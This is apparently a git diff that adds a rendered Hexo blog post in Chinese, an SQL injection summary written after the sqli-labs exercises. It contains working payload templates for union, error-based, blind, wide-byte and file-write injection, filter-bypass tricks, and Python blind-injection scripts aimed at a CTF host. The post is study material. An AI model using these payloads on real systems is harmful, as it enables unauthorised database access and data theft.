@@ -1,37 +1,235 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    sql注入总结 |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
+  
+<link rel="stylesheet" href="/css/technology.css">
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+  
+  
+<script src="/js/pace.min.js"></script>
 
+<meta name="generator" content="Hexo 5.1.1"></head>
 
-{% block content %}
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-sql注入总结" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入总结
+    </h1>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2020-08-28T02:45:10.000Z" itemprop="datePublished">2020-08-28</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <h2 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h2><p>刷完了sqlilab，今天来总结一下注入的相关内容。</p>
+<h4 id="0x00-注入类别"><a href="#0x00-注入类别" class="headerlink" title="0x00 注入类别"></a>0x00 注入类别</h4><h5 id="按变量类型分类"><a href="#按变量类型分类" class="headerlink" title="按变量类型分类"></a>按变量类型分类</h5><ul>
+<li>数字型(没有引号)</li>
+<li>字符型(有引号)</li>
+</ul>
+<h5 id="按提交方式分类"><a href="#按提交方式分类" class="headerlink" title="按提交方式分类"></a>按提交方式分类</h5><ul>
+<li>GET型</li>
+<li>POST型</li>
+<li>COOKIE型</li>
+</ul>
+<h5 id="按注入方式分类"><a href="#按注入方式分类" class="headerlink" title="按注入方式分类"></a>按注入方式分类</h5><ul>
+<li>union联合查询注入</li>
+<li>报错注入</li>
+</ul>
+<ul>
+<li>盲注<ul>
+<li>基于时间的盲注</li>
+<li>基于布尔的盲注</li>
+</ul>
+</li>
+</ul>
+<h5 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h5><ul>
+<li>宽字节注入</li>
+</ul>
+<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><ul>
+<li>二次注入</li>
+<li>文件读写，DNSlog</li>
+</ul>
+<h4 id="0x01-可能存在注入的位置"><a href="#0x01-可能存在注入的位置" class="headerlink" title="0x01 可能存在注入的位置"></a>0x01 可能存在注入的位置</h4><p>1.GET数据</p>
+<p>2.POST数据</p>
+<p>3.http请求头</p>
+<p>4.cookie</p>
+<h4 id="0x02-引号-括号闭合方式"><a href="#0x02-引号-括号闭合方式" class="headerlink" title="0x02 引号/括号闭合方式"></a>0x02 引号/括号闭合方式</h4><p>主要有以下7种，判断的时候除了尝试外还需要根据报错信息(如果有的话)进行快速确定。</p>
+<p>总结一下常见的一些闭合方式：</p>
+<blockquote>
+<p>1.单引号闭合<code>&#39;</code></p>
+<p>2.双引号闭合<code>&quot;</code></p>
+<p>3.单引号加括号<code>&#39;)</code>‘</p>
+<p>4.双引号加括号<code>&#39;&quot;)</code></p>
+<p>5.括号(仅限数字型注入)<code>)</code></p>
+<p>6.单引号加双括号<code>&#39;))</code></p>
+<p>7.双引号加括号<code>&quot;))</code></p>
+</blockquote>
+<h4 id="0x03-联合查询注入的模板"><a href="#0x03-联合查询注入的模板" class="headerlink" title="0x03 联合查询注入的模板"></a>0x03 联合查询注入的模板</h4><p>联合查询注入主要借助 union select 来完成，一般payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param&#x3D;-1&#39; union select 1,2[,3,...] %23</span><br></pre></td></tr></table></figure>
+
+<p>查数据库，表，列通过information_schema中的各个数据表来获取，注意回显位，以当前数据表一共4列，第二列数据会回显为例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?param=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span>,<span class="number">4</span> %<span class="number">23</span></span><br><span class="line">?param=<span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;XXXX&quot;),3,4 %23</span></span><br><span class="line"><span class="string">?param=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&quot;XXXX&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXXX&quot;</span>),<span class="number">3</span>,<span class="number">4</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>联合查询注入适用范围：有回显，有报错</strong></p>
+<h4 id="0x04-报错注入的模板"><a href="#0x04-报错注入的模板" class="headerlink" title="0x04 报错注入的模板"></a>0x04 报错注入的模板</h4><p>报错注入主要借助特殊函数，构造特殊输入造成报错，将重要信息带到报错信息中，一般payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,database()),1) %23</span><br></pre></td></tr></table></figure>
+
+<p>报错注入常用函数：   </p>
+<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><p>函数原型：<code>UPDATEXML(XML_document, XPath_string, new_value);</code><br>第一个参数：<code>XML_document</code>，是String格式，是XML文档对象的名称<br>第二个参数：<code>XPath_string</code>，XPath格式的字符串<br>第三个参数：<code>new_value</code>，String格式，替换查找到符合条件的数据<br>函数作用：改变文档中符合条件的节点的值。<br>注：updatexml最多只能显示32位，需要配合substr等字符串处理函数使用。<br>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;index.php?id&#x3D;1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><p>函数原型：<code>EXTRACTVALUE(XML_document, XPath_string)</code><br>参数含义同上。<br>举例:   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;index.php?id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
+
+<h5 id="几何对象"><a href="#几何对象" class="headerlink" title="几何对象"></a>几何对象</h5><p>MySQL中支持的几何数据类型包括Geometry,Point,LineString,Polygon以及集合类型的MultiPoint,MultiLineString,MultiPolygon,GeometryCollection.其中Geometry可以表示任意一种几何类型，即在MySQL中，如果一个字段类型是Geometry，则可以存储Point、LineString等其它几何类型的值。其他的几种则需要固定有效的表示格式。<br>我们可以借助几何对象的相关函数进行报错注入。<br>geometrycollection():<code>id=1 and geometrycollection((select * from(select * from(select user())a)b))</code><br>multipoint():<code>id=1 and multipoint((select * from(select * from(select user())a)b))</code><br>polygon():<code>id=1 and polygon((select * from(select * from(select user())a)b))</code><br>multipolygon():<code>id=1 and multipolygon((select * from(select * from(select user())a)b))</code><br>linestring():<code>id=1 and linestring((select * from(select * from(select user())a)b))</code><br>multilinestring():<code>id=1 and multilinestring((select * from(select * from(select user())a)b))</code>   </p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h5><p>例子：<br><code>id=1 and exp(~(select * from(select user())a))</code>   </p>
+<p><strong>报错注入适用范围：无回显，但可以获得详细报错信息。</strong></p>
+<h4 id="0x05-盲注"><a href="#0x05-盲注" class="headerlink" title="0x05 盲注"></a>0x05 盲注</h4><p>盲注主要分为布尔盲注，时间盲注，其中布尔盲注通过页面报错or不报错(或者显示不同信息)来判断某一次查询结果是否为真，时间盲注通过请求响应时间来判断某一次猜解是否正确。</p>
+<p>盲注要灵活运用字符串处理函数，例如substr,left,right。</p>
+<p>通用payload：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?param=1&#x27; and if(ascii(substr(database(),&#123;pos&#125;,1))&gt;&#123;val&#125;,1,0) %23 # 布尔，借助if函数(if被过滤可使用case when)</span><br><span class="line">?param=1&#x27; and ascii(substr(database(),&#123;pos&#125;,1)&gt;&#123;val&#125;) and sleep(3) %23 # 时间，如果第二部分为真则被短路第三部分不执行，否则执行第三部分</span><br></pre></td></tr></table></figure>
+
+<p>通过变换pos和val的值完成对某一项信息的逐位猜解。主要借助二分法来完成某一位pos的值的判断，效率较高。</p>
+<p>举一个例子，V1lu0实验室招新hard_sql，第一步爆破数据库名的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">&quot;?user=1&#x27; and if(ascii(substr(database(), &#123;&#125;,1))=&#123;&#125;,pow(999,999),1) %23&amp;pass=123&quot;</span>.format(i, j)</span><br><span class="line">        url = <span class="string">&quot;http://v8.su29029.xyz:10010/index.php&quot;</span> + payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># print(j, end = &quot; &quot;)</span></span><br><span class="line">        <span class="keyword">if</span> (r.text.find(<span class="string">&#x27;Something wrong&#x27;</span>) != <span class="number">-1</span>):</span><br><span class="line">            print(chr(j))</span><br></pre></td></tr></table></figure>
+<p>这个脚本主要是报错盲注，题目的提示是，语句为真则登录成功，语句为假则返回失败，语句出错则返回something wrong。   </p>
+<p>这里是直接通过逐位爆破完成的盲注，二分法的脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    min=<span class="number">65</span></span><br><span class="line">    max=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span>(abs(max - min) &gt; <span class="number">1</span>):</span><br><span class="line">        mid = (max + min)//<span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;?user=1&#x27; and if(ascii(substr(database(), &#123;&#125;,1))&gt;&#123;&#125;,pow(999,999),1) %23&amp;pass=123&quot;</span>.format(i, mid)</span><br><span class="line">        url = <span class="string">&quot;http://v8.su29029.xyz:10010/index.php&quot;</span> + payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="comment"># print(mid, end = &quot; &quot;)</span></span><br><span class="line">        <span class="keyword">if</span> (r.text.find(<span class="string">&#x27;Something wrong&#x27;</span>) != <span class="number">-1</span>):</span><br><span class="line">            min=mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max=mid</span><br><span class="line">res += chr(max)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x06-宽字节注入"><a href="#0x06-宽字节注入" class="headerlink" title="0x06 宽字节注入"></a>0x06 宽字节注入</h4><p>宽字节注入主要借助GBK编码，由于mysql的识别错误(错误地将两个url编码字符识别成一个，从而吞掉原本的转义字符或特殊的防注入字符)，导致注入。</p>
+<p>通用payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?param=1%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="0x07-二次注入"><a href="#0x07-二次注入" class="headerlink" title="0x07 二次注入"></a>0x07 二次注入</h4><p>二次注入主要是利用逻辑漏洞，向数据库中插入脏数据，程序运行中二次去除了脏数据缺未过滤，导致恶意sql代码被执行。常见于用户修改密码逻辑，注册逻辑等。</p>
+<h4 id="0x08-文件读写，DNSlog"><a href="#0x08-文件读写，DNSlog" class="headerlink" title="0x08 文件读写，DNSlog"></a>0x08 文件读写，DNSlog</h4><p>mysql中load_file()函数可以用于读取本地文件，into outfile 可以向本地写入文件，例如写入一句话木马。</p>
+<p>load_file()函数的一个应用是在Windows系统中通过访问由重要信息拼接而成的url，访问url需要进行dns解析，通过查看解析记录即可获取到重要信息。(具体可以参见上一篇博客sqliab学习总结（三）)。</p>
+<h4 id="0x09-过滤问题"><a href="#0x09-过滤问题" class="headerlink" title="0x09 过滤问题"></a>0x09 过滤问题</h4><p>主要绕过方法：双写绕过，任意大小写绕过，相同功能函数绕过，可代替字符绕过。</p>
+<p>1.空格，注释，引号，逗号，等号，大于号，小于号</p>
+<p>空格主要通过%a0绕过，成功率高。也可通过/**/，以及巧用括号的方式绕过</p>
+<p>避免使用注释的方法主要是巧妙闭合单引号。</p>
+<p>引号的绕过主要可以通过括号，或者单双引号逃逸的方法。</p>
+<p>逗号的绕过主要可以通过join完成，例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p>对于某些字符串处理函数，例如substr，可以通过substr(str from pos for len)的方法以避免使用括号，limit 0,1 可以通过limit 1 offset 1代替。</p>
+<p>等号主要通过like绕过。</p>
+<p>大于号小于号主要使用greatest函数，strcmp函数，between and操作符代替。</p>
+<p>2.union select</p>
+<p>尝试两个单词之间加%0a，任意大小写，双写。</p>
+<p>3.and or</p>
+<p>and可以通过&amp;&amp;替代，or可以通过||替代。</p>
+<p>4.if</p>
+<p>使用case when代替</p>
+<p>其余关于过滤的内容见<a target="_blank" rel="noopener" href="https://github.com/su29029/su29029.github.io/blob/master/_posts/2020-7-8-sql%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98.md">明天的笔记</a></p>
+
+      
     </div>
+    <footer class="article-footer">
+      <a data-url="https://su29029.github.io/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" data-id="ckedortlz000yxityfrdy08dq"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
   </div>
 
-{% endblock %}
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            sql注入过滤问题
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%89%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">sqlilab做题总结（三）</div>
+      </a>
+    
+  </nav>
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
